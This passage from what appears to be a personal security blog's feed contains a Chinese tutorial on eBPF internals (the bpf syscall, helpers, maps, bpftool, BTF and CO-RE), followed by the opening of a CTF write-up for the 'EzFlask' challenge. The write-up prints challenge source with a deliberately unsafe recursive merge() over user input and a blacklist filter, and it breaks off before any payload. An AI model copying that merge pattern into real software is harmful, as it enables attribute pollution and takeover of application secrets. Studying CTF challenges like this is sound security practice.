class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">/* 1) 加载BPF程序 */</span><br><span class="line">bpf(BPF_PROG_LOAD,...) = 4</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">/* 2）查询事件类型 */</span><br><span class="line">openat(AT_FDCWD, <span class="string">&quot;/sys/bus/event_source/devices/kprobe/type&quot;</span>, O_RDONLY) = 5</span><br><span class="line"><span class="built_in">read</span>(5, <span class="string">&quot;6\n&quot;</span>, 4096)                    = 2</span><br><span class="line">close(5)                                = 0</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">/* 3）创建性能监控事件 */</span><br><span class="line">perf_event_open(</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">type</span>=0x6 /* PERF_TYPE_??? */,</span><br><span class="line">        size=PERF_ATTR_SIZE_VER7,</span><br><span class="line">        ...</span><br><span class="line">        wakeup_events=1,</span><br><span class="line">        config1=0x7f275d195c50,</span><br><span class="line">        ...</span><br><span class="line">    &#125;,</span><br><span class="line">    -1,</span><br><span class="line">    0,</span><br><span class="line">    -1,</span><br><span class="line">    PERF_FLAG_FD_CLOEXEC) = 5</span><br><span class="line"></span><br><span class="line">/* 4）绑定 BPF 到 kprobe 事件 */</span><br><span class="line">ioctl(5, PERF_EVENT_IOC_SET_BPF, 4)     = 0</span><br><span class="line">...</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>从输出中，我们可以看出 BPF 与性能事件的绑定过程分为以下几步：</p><ul><li>首先，借助 bpf 系统调用，加载 BPF 程序，并记住返回的文件描述符；</li><li>然后，查询 kprobe 类型的事件编号。BCC 实际上是通过  <code>/sys/bus/event_source/devices/kprobe/type</code> 来查询的；</li><li>接着，调用  <code>perf_event_open</code>  创建性能监控事件。比如，事件类型（type 是上一步查询到的 6）、事件的参数（ config1 包含了内核函数 <code>do_sys_openat2</code> ）等；</li><li>最后，再通过 <code>ioctl</code> 的 <code>PERF_EVENT_IOC_SET_BPF</code> 命令，将 BPF 程序绑定到性能监控事件。</li></ul><h3 id="小结-eBPF-虚拟机工作原理"><a href="#小结-eBPF-虚拟机工作原理" class="headerlink" title="小结 eBPF 虚拟机工作原理"></a>小结 eBPF 虚拟机工作原理</h3><p>梳理 eBPF 在内核中的实现原理，并以上一讲的 Hello World 程序为例，借助 bpftool、strace 等工具，观察了 BPF 指令的具体格式。</p><p>然后，我们从 BCC 执行 eBPF 程序的过程入手，一起看了 BPF 指令的加载和执行过程。用高级语言开发的 eBPF 程序，需要首先编译为 BPF 字节码（即 BPF 指令），然后借助  bpf  系统调用加载到内核中，最后再通过性能监控等接口，与具体的内核事件进行绑定。这样，内核的性能监控模块才会在内核事件发生时，自动执行我们开发的 eBPF 程序。</p><h2 id="eBPF-程序是怎么跟内核进行交互的"><a href="#eBPF-程序是怎么跟内核进行交互的" class="headerlink" title="eBPF 程序是怎么跟内核进行交互的"></a>eBPF 程序是怎么跟内核进行交互的</h2><p>eBPF 程序到底是如何跟内核事件进行绑定的？又该如何跟内核中的其他模块进行交互呢？今天，一起看看 eBPF 程序的编程接口。</p><p>如下图（图片来自 brendangregg.com）所示，一个完整的 eBPF 程序通常包含用户态和内核态两部分。其中，用户态负责 eBPF 程序的加载、事件绑定以及 eBPF 程序运行结果的汇总输出；内核态运行在 eBPF 虚拟机中，负责定制和控制系统的运行状态。</p><img src="/2023/08/03/eBPF-%E8%BF%90%E8%A1%8C%E5%8E%9F%E7%90%86/CompleteProgram.png" class><p>对于用户态程序来说，我想你已经了解，<strong>它们与内核进行交互时必须要通过系统调用来完成</strong>。而对应到 eBPF 程序中，我们最常用到的就是 <a class="link" href="https://man7.org/linux/man-pages/man2/bpf.2.html">bpf 系统调用<i class="fas fa-external-link-alt"></i></a>。</p><p>在命令行中输入 man bpf ，就可以查询到 BPF 系统调用的调用格式（虽然前面已经看过了</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/bpf.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">bpf</span><span class="params">(<span class="type">int</span> cmd, <span class="keyword">union</span> bpf_attr *attr, <span class="type">unsigned</span> <span class="type">int</span> size)</span>;</span><br></pre></td></tr></table></figure><p>BPF 系统调用接受三个参数：</p><ul><li>第一个，cmd ，代表操作命令，比如上一讲中我们看到的 <code>BPF_PROG_LOAD</code> 就是加载 eBPF 程序；</li><li>第二个，attr，代表 <code>bpf_attr</code> 类型的 eBPF 属性指针，不同类型的操作命令需要传入不同的属性参数；</li><li>第三个，size ，代表属性的大小。</li></ul><p>注意，不同版本的内核所支持的 BPF 命令是不同的，具体支持的命令列表可以参考内核头文件 <code>include/uapi/linux/bpf.h</code> 中  <code>bpf_cmd</code> 的定义。比如，v5.13 内核已经支持 36 个 BPF 命令：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">bpf_cmd</span> &#123;</span></span><br><span class="line">  BPF_MAP_CREATE,</span><br><span class="line">  BPF_MAP_LOOKUP_ELEM,</span><br><span class="line">  BPF_MAP_UPDATE_ELEM,</span><br><span class="line">  BPF_MAP_DELETE_ELEM,</span><br><span class="line">  BPF_MAP_GET_NEXT_KEY,</span><br><span class="line">  BPF_PROG_LOAD,</span><br><span class="line">  BPF_OBJ_PIN,</span><br><span class="line">  BPF_OBJ_GET,</span><br><span class="line">  BPF_PROG_ATTACH,</span><br><span class="line">  BPF_PROG_DETACH,</span><br><span class="line">  BPF_PROG_TEST_RUN,</span><br><span class="line">  BPF_PROG_GET_NEXT_ID,</span><br><span class="line">  BPF_MAP_GET_NEXT_ID,</span><br><span class="line">  BPF_PROG_GET_FD_BY_ID,</span><br><span class="line">  BPF_MAP_GET_FD_BY_ID,</span><br><span class="line">  BPF_OBJ_GET_INFO_BY_FD,</span><br><span class="line">  BPF_PROG_QUERY,</span><br><span class="line">  BPF_RAW_TRACEPOINT_OPEN,</span><br><span class="line">  BPF_BTF_LOAD,</span><br><span class="line">  BPF_BTF_GET_FD_BY_ID,</span><br><span class="line">  BPF_TASK_FD_QUERY,</span><br><span class="line">  BPF_MAP_LOOKUP_AND_DELETE_ELEM,</span><br><span class="line">  BPF_MAP_FREEZE,</span><br><span class="line">  BPF_BTF_GET_NEXT_ID,</span><br><span class="line">  BPF_MAP_LOOKUP_BATCH,</span><br><span class="line">  BPF_MAP_LOOKUP_AND_DELETE_BATCH,</span><br><span class="line">  BPF_MAP_UPDATE_BATCH,</span><br><span class="line">  BPF_MAP_DELETE_BATCH,</span><br><span class="line">  BPF_LINK_CREATE,</span><br><span class="line">  BPF_LINK_UPDATE,</span><br><span class="line">  BPF_LINK_GET_FD_BY_ID,</span><br><span class="line">  BPF_LINK_GET_NEXT_ID,</span><br><span class="line">  BPF_ENABLE_STATS,</span><br><span class="line">  BPF_ITER_CREATE,</span><br><span class="line">  BPF_LINK_DETACH,</span><br><span class="line">  BPF_PROG_BIND_MAP,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>命令对应的表格</p><img src="/2023/08/03/eBPF-%E8%BF%90%E8%A1%8C%E5%8E%9F%E7%90%86/CompleteProgram.png" class><h3 id="BPF-辅助函数"><a href="#BPF-辅助函数" class="headerlink" title="BPF 辅助函数"></a>BPF 辅助函数</h3><p>说完用户态程序的 bpf 系统调用格式，我们再来看看内核态的 eBPF 程序。</p><p>eBPF 程序并不能随意调用内核函数，因此，内核定义了一系列的辅助函数，用于 eBPF 程序与内核其他模块进行交互，这一个实现方式其实是通过 eBPF helpers 来做的。</p><p>比如，上一讲的 Hello World 示例中使用的 <code>bpf_trace_printk()</code> 就是最常用的一个辅助函数，用于向调试文件系统（<code>/sys/kernel/debug/tracing/trace_pipe</code>）写入调试信息。</p><p>这里补充一个知识点：从内核 5.13 版本开始，部分内核函数（如  <code>tcp_slow_start()</code>、<code>tcp_reno_ssthresh()</code>  等）也可以被 BPF 程序直接调用了，具体你可以查看<a class="link" href="https://lwn.net/Articles/856005/">这个链接<i class="fas fa-external-link-alt"></i></a>。 不过，这些函数只能在 TCP 拥塞控制算法的 BPF 程序中调用，此处不再做过多的介绍。</p><p>需要注意的是，并不是所有的辅助函数都可以在 eBPF 程序中随意使用，不同类型的 eBPF 程序所支持的辅助函数是不同的。比如，对于 Hello World 示例这类内核探针（kprobe）类型的 eBPF 程序，你可以在命令行中执行  <code>bpftool feature probe</code> ，来查询当前系统支持的辅助函数列表：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">$ bpftool feature probe</span><br><span class="line">...</span><br><span class="line">eBPF helpers supported <span class="keyword">for</span> program <span class="built_in">type</span> kprobe:</span><br><span class="line">  - bpf_map_lookup_elem</span><br><span class="line">  - bpf_map_update_elem</span><br><span class="line">  - bpf_map_delete_elem</span><br><span class="line">  - bpf_probe_read</span><br><span class="line">  - bpf_ktime_get_ns</span><br><span class="line">  - bpf_get_prandom_u32</span><br><span class="line">  - bpf_get_smp_processor_id</span><br><span class="line">  - bpf_tail_call</span><br><span class="line">  - bpf_get_current_pid_tgid</span><br><span class="line">  - bpf_get_current_uid_gid</span><br><span class="line">  - bpf_get_current_comm</span><br><span class="line">  - bpf_perf_event_read</span><br><span class="line">  - bpf_perf_event_output</span><br><span class="line">  - bpf_get_stackid</span><br><span class="line">  - bpf_get_current_task</span><br><span class="line">  - bpf_current_task_under_cgroup</span><br><span class="line">  - bpf_get_numa_node_id</span><br><span class="line">  - bpf_probe_read_str</span><br><span class="line">  - bpf_perf_event_read_value</span><br><span class="line">  - bpf_override_return</span><br><span class="line">  - bpf_get_stack</span><br><span class="line">  - bpf_get_current_cgroup_id</span><br><span class="line">  - bpf_map_push_elem</span><br><span class="line">  - bpf_map_pop_elem</span><br><span class="line">  - bpf_map_peek_elem</span><br><span class="line">  - bpf_send_signal</span><br><span class="line">  - bpf_probe_read_user</span><br><span class="line">  - bpf_probe_read_kernel</span><br><span class="line">  - bpf_probe_read_user_str</span><br><span class="line">  - bpf_probe_read_kernel_str</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>对于这些辅助函数的详细定义，你可以在命令行中执行  man bpf-helpers ，或者参考内核头文件  <a class="link" href="https://elixir.bootlin.com/linux/v5.13/source/include/uapi/linux/bpf.h#L1463">bpf.h - include&#x2F;uapi&#x2F;linux&#x2F;bpf.h<i class="fas fa-external-link-alt"></i></a>，来查看它们的详细定义和使用说明。为了方便掌握，我把常用的辅助函数整理成了一个表格，可以在需要时参考：</p><img src="/2023/08/03/eBPF-%E8%BF%90%E8%A1%8C%E5%8E%9F%E7%90%86/bpfHelpersExcel.png" class><p>这其中，需要你特别注意的是以 <code>bpf_probe_read</code>  开头的一系列函数。在上一讲中已经提到，eBPF 内部的内存空间只有寄存器和栈。所以，要访问其他的内核空间或用户空间地址，就需要借助  <code>bpf_probe_read</code>  这一系列的辅助函数。这些函数会进行安全性检查，并禁止缺页中断的发生。</p><p>而在 eBPF 程序需要大块存储时，就不能像常规的内核代码那样去直接分配内存了，而是必须通过 BPF 映射（BPF Map）来完成。接下来，我带你看看 BPF 映射的具体原理。</p><h3 id="BPF-映射"><a href="#BPF-映射" class="headerlink" title="BPF 映射"></a>BPF 映射</h3><p>BPF 映射用于提供大块的键值存储，这些存储可被用户空间程序访问，进而获取 eBPF 程序的运行状态。eBPF 程序最多可以访问 64 个不同的 BPF 映射，并且不同的 eBPF 程序也可以通过相同的 BPF 映射来共享它们的状态。下图（图片来自docs.cilium.io）展示了  BPF 映射的基本使用方法。</p><img src="/2023/08/03/eBPF-%E8%BF%90%E8%A1%8C%E5%8E%9F%E7%90%86/UsageOfBPFMap.png" class><p>在前面的 BPF 系统调用和辅助函数小节中，你也看到，有很多系统调用命令和辅助函数都是用来访问 BPF 映射的。我相信细心的你已经发现了：BPF 辅助函数中并没有 BPF 映射的创建函数，BPF 映射只能通过用户态程序的系统调用来创建。比如，你可以通过下面的示例代码来创建一个 BPF 映射，并返回映射的文件描述符：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">bpf_create_map</span><span class="params">(<span class="keyword">enum</span> bpf_map_type map_type,</span></span><br><span class="line"><span class="params">       <span class="type">unsigned</span> <span class="type">int</span> key_size,</span></span><br><span class="line"><span class="params">       <span class="type">unsigned</span> <span class="type">int</span> value_size, <span class="type">unsigned</span> <span class="type">int</span> max_entries)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">union</span> <span class="title">bpf_attr</span> <span class="title">attr</span> =</span> &#123;</span><br><span class="line">    .map_type = map_type,</span><br><span class="line">    .key_size = key_size,</span><br><span class="line">    .value_size = value_size,</span><br><span class="line">    .max_entries = max_entries</span><br><span class="line">  &#125;;</span><br><span class="line">  <span class="keyword">return</span> bpf(BPF_MAP_CREATE, &amp;attr, <span class="keyword">sizeof</span>(attr));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这其中，最关键的是设置映射的类型。内核头文件 <code>include/uapi/linux/bpf.h</code> 中的  <code>bpf_map_type</code> 定义了所有支持的映射类型，你可以使用如下的 bpftool 命令，来查询当前系统支持哪些映射类型：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ bpftool feature probe | grep map_type</span><br><span class="line">eBPF map_type <span class="built_in">hash</span> is available</span><br><span class="line">eBPF map_type array is available</span><br><span class="line">eBPF map_type prog_array is available</span><br><span class="line">eBPF map_type perf_event_array is available</span><br><span class="line">eBPF map_type percpu_hash is available</span><br><span class="line">eBPF map_type percpu_array is available</span><br><span class="line">eBPF map_type stack_trace is available</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>在下面的表格中，整理了几种最常用的映射类型及其功能和使用场景：</p><img src="/2023/08/03/eBPF-%E8%BF%90%E8%A1%8C%E5%8E%9F%E7%90%86/UsualMapSecne.png" class><p>如果你的 eBPF 程序使用了 BCC 库，你还可以使用预定义的宏来简化 BPF 映射的创建过程。比如，对哈希表映射来说，BCC 定义了  <code>BPF_HASH(name, key_type=u64, leaf_type=u64, size=10240)</code>，因此，你就可以通过下面的几种方法来创建一个哈希表映射：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 使用默认参数 key_type=u64, leaf_type=u64, size=10240</span></span><br><span class="line">BPF_HASH(stats);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用自定义key类型，保持默认 leaf_type=u64, size=10240</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">key_t</span> &#123;</span></span><br><span class="line">  <span class="type">char</span> c[<span class="number">80</span>];</span><br><span class="line">&#125;;</span><br><span class="line">BPF_HASH(counts, <span class="keyword">struct</span> <span class="type">key_t</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 自定义所有参数</span></span><br><span class="line">BPF_HASH(cpu_time, <span class="type">uint64_t</span>, <span class="type">uint64_t</span>, <span class="number">4096</span>);</span><br></pre></td></tr></table></figure><p>除了创建之外，映射的删除也需要你特别注意。BPF 系统调用中并没有删除映射的命令，这是因为 <strong>BPF 映射会在用户态程序关闭文件描述符的时候自动删除（即close(fd) ）</strong>。 如果你想在程序退出后还保留映射，就需要调用  <code>BPF_OBJ_PIN</code> 命令，将映射挂载到 <code>/sys/fs/bpf</code> 中。</p><p>在调试 BPF 映射相关的问题时，你还可以通过 bpftool 来查看或操作映射的具体内容。比如，你可以通过下面这些命令创建、更新、输出以及删除映射：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//创建一个哈希表映射，并挂载到/sys/fs/bpf/stats_map(Key和Value的大小都是2字节)</span></span><br><span class="line">bpftool <span class="built_in">map</span> create /sys/fs/bpf/stats_map type hash key <span class="number">2</span> value <span class="number">2</span> entries <span class="number">8</span> name stats_map</span><br><span class="line"></span><br><span class="line"><span class="comment">//查询系统中的所有映射</span></span><br><span class="line">bpftool <span class="built_in">map</span></span><br><span class="line"><span class="comment">//示例输出</span></span><br><span class="line"><span class="comment">//340: hash  name stats_map  flags 0x0</span></span><br><span class="line"><span class="comment">//        key 2B  value 2B  max_entries 8  memlock 4096B</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//向哈希表映射中插入数据</span></span><br><span class="line">bpftool <span class="built_in">map</span> update name stats_map key <span class="number">0xc1</span> <span class="number">0xc2</span> value <span class="number">0xa1</span> <span class="number">0xa2</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//查询哈希表映射中的所有数据</span></span><br><span class="line"> </span><br><span class="line">bpftool <span class="built_in">map</span> dump name stats_map</span><br><span class="line"><span class="comment">//示例输出</span></span><br><span class="line"><span class="comment">//key: c1 c2  value: a1 a2</span></span><br><span class="line"><span class="comment">//Found 1 element</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//删除哈希表映射</span></span><br><span class="line">rm /sys/fs/bpf/stats_map</span><br></pre></td></tr></table></figure><img src="/2023/08/03/eBPF-%E8%BF%90%E8%A1%8C%E5%8E%9F%E7%90%86/MapBasicUse.png" class><h3 id="BPF-类型格式（BTF）"><a href="#BPF-类型格式（BTF）" class="headerlink" title="BPF 类型格式（BTF）"></a>BPF 类型格式（BTF）</h3><p>了解过 BPF 辅助函数和映射之后，我们再来看一个开发 eBPF 程序时最常碰到的问题：内核数据结构的定义。</p><p>在安装 BCC 工具的时候，你可能就注意到了，内核头文件 <code>linux-headers-$(uname -r)</code> 也是必须要安装的一个依赖项。这是因为 BCC 在编译 eBPF 程序时，需要从内核头文件中找到相应的内核数据结构定义。这样，你在调用 <code>bpf_probe_read</code> 时，才能从内存地址中提取到正确的数据类型。</p><p>但是，编译时依赖内核头文件也会带来很多问题。主要有这三个方面：</p><ul><li>首先，在开发 eBPF 程序时，为了获得内核数据结构的定义，就需要引入一大堆的内核头文件；</li><li>其次，内核头文件的路径和数据结构定义在不同内核版本中很可能不同。因此，你在升级内核版本时，就会遇到找不到头文件和数据结构定义错误的问题；</li><li>最后，在很多生产环境的机器中，出于安全考虑，并不允许安装内核头文件，这时就无法得到内核数据结构的定义。<strong>在程序中重定义数据结构</strong>虽然可以暂时解决这个问题，但也很容易把使用着错误数据结构的 eBPF 程序带入新版本内核中运行。</li></ul><p>那么，这么多的问题该怎么解决呢？不用担心，BPF 类型格式（BPF Type Format, BTF）的诞生正是为了解决这些问题。</p><p>从内核 5.2 开始，只要开启了 <code>CONFIG_DEBUG_INFO_BTF</code>，在编译内核时，内核数据结构的定义就会自动内嵌在内核二进制文件 vmlinux 中。并且，你还可以借助下面的命令，把这些数据结构的定义导出到一个头文件中（通常命名为 <code>vmlinux.h</code>）:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bpftool btf dump file /sys/kernel/btf/vmlinux format c &gt; vmlinux.h</span><br></pre></td></tr></table></figure><p>如下图（图片来自 GRANT SELTZER 博客）所示，有了内核数据结构的定义，你在开发 eBPF 程序时只需要引入一个 <code>vmlinux.h</code> 即可，不用再引入一大堆的内核头文件了。</p><img src="/2023/08/03/eBPF-%E8%BF%90%E8%A1%8C%E5%8E%9F%E7%90%86/vmlinuxH.png" class><p>同时，借助 BTF、bpftool 等工具，我们也可以更好地了解 BPF 程序的内部信息，这也会让调试变得更加方便。比如，在查看 BPF 映射的内容时，你可以直接看到结构化的数据，而不只是十六进制数值：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># bpftool map dump id 386</span></span><br><span class="line">[</span><br><span class="line">  &#123;</span><br><span class="line">      <span class="string">&quot;key&quot;</span>: 0,</span><br><span class="line">      <span class="string">&quot;value&quot;</span>: &#123;</span><br><span class="line">          <span class="string">&quot;eth0&quot;</span>: &#123;</span><br><span class="line">              <span class="string">&quot;value&quot;</span>: 0,</span><br><span class="line">              <span class="string">&quot;ifindex&quot;</span>: 0,</span><br><span class="line">              <span class="string">&quot;mac&quot;</span>: []</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line">]</span><br></pre></td></tr></table></figure><p>解决了内核数据结构的定义问题，接下来的问题就是，<strong>如何让 eBPF 程序在内核升级之后，不需要重新编译就可以直接运行</strong>。eBPF 的一次编译到处执行（Compile Once Run Everywhere，简称 CO-RE）项目借助了 BTF 提供的调试信息，再通过下面的两个步骤，使得 eBPF 程序可以适配不同版本的内核：</p><ul><li>第一，通过对 BPF 代码中的访问偏移量进行重写，解决了不同内核版本中数据结构偏移量不同的问题；</li><li>第二，在 libbpf 中预定义不同内核版本中的数据结构的修改，解决了不同内核中数据结构不兼容的问题。</li></ul><p>BTF 和一次编译到处执行带来了很多的好处，但你也需要注意这一点：它们都要求比较新的内核版本（&gt;&#x3D;5.2），并且需要非常新的发行版（如 Ubuntu 20.10+、RHEL 8.2+ 等）才会默认打开内核配置 <code>CONFIG_DEBUG_INFO_BTF</code>。对于旧版本的内核，虽然它们不会再去内置 BTF 的支持，但开源社区正在尝试通过 BTFHub 等方法，为它们提供 BTF 调试信息。</p><h3 id="小结-eBPF-程序是怎么跟进程进行交互的"><a href="#小结-eBPF-程序是怎么跟进程进行交互的" class="headerlink" title="小结 eBPF 程序是怎么跟进程进行交互的"></a>小结 eBPF 程序是怎么跟进程进行交互的</h3><p>一个完整的 eBPF 程序，通常包含用户态和内核态两部分：用户态程序需要通过 BPF 系统调用跟内核进行交互，进而完成 eBPF 程序加载、事件挂载以及映射创建和更新等任务；而在内核态中，eBPF 程序也不能任意调用内核函数，而是需要通过 BPF 辅助函数完成所需的任务。尤其是在访问内存地址的时候，必须要借助  <code>bpf_probe_read</code> 系列函数读取内存数据，以确保内存的安全和高效访问。</p><p>在 eBPF 程序需要大块存储时，我们还需要根据应用场景，引入特定类型的 BPF 映射，并借助它向用户空间的程序提供运行状态的数据。</p><h2 id="Ref"><a href="#Ref" class="headerlink" title="Ref"></a>Ref</h2><p>极客时间 eBPF 核心技术与实战</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;eBPF 运行原理，eBPF 学习（二）&lt;/p&gt;</summary>
    
    
    
    <category term="eBPF" scheme="https://drun1baby.github.io/categories/eBPF/"/>
    
    
    <category term="eBPF" scheme="https://drun1baby.github.io/tags/eBPF/"/>
    
  </entry>
  
  <entry>
    <title>2023 DASCTF 七月赛&amp;0x401 WP</title>
    <link href="https://drun1baby.github.io/2023/08/03/2023-DASCTF-%E4%B8%83%E6%9C%88%E8%B5%9B-0x401-WP/"/>
    <id>https://drun1baby.github.io/2023/08/03/2023-DASCTF-%E4%B8%83%E6%9C%88%E8%B5%9B-0x401-WP/</id>
    <published>2023-08-03T03:13:18.000Z</published>
    <updated>2023-08-06T03:09:40.753Z</updated>
    
    <content type="html"><![CDATA[<p>有点赶，含一道复现</p><span id="more"></span><h1 id="DASCTF-七月赛-x-0x401-CTF"><a href="#DASCTF-七月赛-x-0x401-CTF" class="headerlink" title="DASCTF 七月赛 x 0x401 CTF"></a>DASCTF 七月赛 x 0x401 CTF</h1><h2 id="EzFlask"><a href="#EzFlask" class="headerlink" title="EzFlask"></a>EzFlask</h2><p>源码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, session</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> black_list</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.secret_key = <span class="built_in">str</span>(uuid.uuid4())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">data</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> black_list:</span><br><span class="line">        <span class="keyword">if</span> i <span class="keyword">in</span> data:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">src, dst</span>):</span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> src.items():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> dst.get(k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        <span class="keyword">elif</span> 